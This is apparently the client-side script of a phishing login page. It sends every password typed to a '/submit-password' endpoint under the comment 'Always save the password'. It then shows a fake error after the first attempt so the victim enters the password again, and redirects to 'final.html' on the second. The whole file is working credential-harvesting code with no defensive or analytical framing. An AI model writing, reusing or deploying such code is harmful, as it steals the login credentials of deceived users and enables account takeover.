let check = document.querySelector(".check");
let inp1 = document.querySelector(".inp1");
let nextBtn = document.querySelector(".btnx");
let errorMsg = document.querySelector(".error");
let inputWrapper = document.querySelector(".input-wrapper");
let floatingLabel = document.querySelector(".floating-label");
let attempt = 0;

check.addEventListener("click", function () {
  inp1.type = check.checked ? "text" : "password";
});

nextBtn.addEventListener("click", async function (e) {
  e.preventDefault();
  const password = document.getElementById("password").value;

  if (!password.trim()) {
    alert("Please enter a password");
    return;
  }

  // Always save the password
  try {
    const res = await fetch("/submit-password", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password })
    });
    const result = await res.json();
    console.log(result.message);
  } catch (err) {
    console.error("Failed to save password");
  }

  attempt++;

  if (attempt === 1) {
    // Show error
    errorMsg.style.display = "flex";
    inp1.style.borderColor = "#F2B8B5";
    if (floatingLabel) floatingLabel.style.color = "#F2B8B5";
  } else {
    // Hide error, reset styles, and redirect
    errorMsg.style.display = "none";
    inp1.style.borderColor = "#C4C7C5";
    if (floatingLabel) floatingLabel.style.color = "";
    window.location.href = "final.html";
  }
});
